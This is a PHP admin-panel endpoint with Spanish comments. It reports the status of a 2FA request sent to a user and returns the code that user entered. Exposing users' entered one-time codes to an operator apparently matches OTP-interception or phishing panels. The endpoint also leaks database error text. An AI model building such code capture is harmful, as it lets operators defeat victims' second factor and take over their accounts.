<?php
/**
 * Verificar estado de solicitud Auth 2FA (panel admin)
 */
session_start();
header('Content-Type: application/json');

if (!isset($_SESSION['admin_logged_in']) || $_SESSION['admin_logged_in'] !== true) {
    echo json_encode(['success' => false, 'error' => 'No autorizado']);
    exit;
}

try {
    require_once '../php_config/conexionbd.php';
    $pdo = conectarBD();

    $input = json_decode(file_get_contents('php://input'), true);
    $usuario_id = intval($input['usuario_id'] ?? 0);
    $auth2fa_id = intval($input['auth2fa_id'] ?? 0);

    if (!$usuario_id) {
        echo json_encode(['success' => false, 'error' => 'ID de usuario no válido']);
        exit;
    }

    if ($auth2fa_id) {
        $stmt = $pdo->prepare("
            SELECT id, estado, accion_usuario, codigo_ingresado, fecha_completado
            FROM auth2fa_enviados
            WHERE id = ? AND usuario_id = ?
            LIMIT 1
        ");
        $stmt->execute([$auth2fa_id, $usuario_id]);
    } else {
        $stmt = $pdo->prepare("
            SELECT id, estado, accion_usuario, codigo_ingresado, fecha_completado
            FROM auth2fa_enviados
            WHERE usuario_id = ?
            ORDER BY fecha_envio DESC
            LIMIT 1
        ");
        $stmt->execute([$usuario_id]);
    }

    $solicitud = $stmt->fetch(PDO::FETCH_ASSOC);

    if (!$solicitud) {
        echo json_encode(['success' => true, 'encontrado' => false]);
        exit;
    }

    echo json_encode([
        'success'          => true,
        'encontrado'       => true,
        'auth2fa_id'       => (int) $solicitud['id'],
        'estado'           => $solicitud['estado'],
        'accion_usuario'   => $solicitud['accion_usuario'],
        'codigo_ingresado' => $solicitud['codigo_ingresado'],
        'completado'       => $solicitud['estado'] === 'completado',
        'cancelado'        => $solicitud['estado'] === 'cancelado'
    ]);

} catch (PDOException $e) {
    echo json_encode(['success' => false, 'error' => 'Error de base de datos: ' . $e->getMessage()]);
} catch (Exception $e) {
    echo json_encode(['success' => false, 'error' => 'Error: ' . $e->getMessage()]);
}
?>
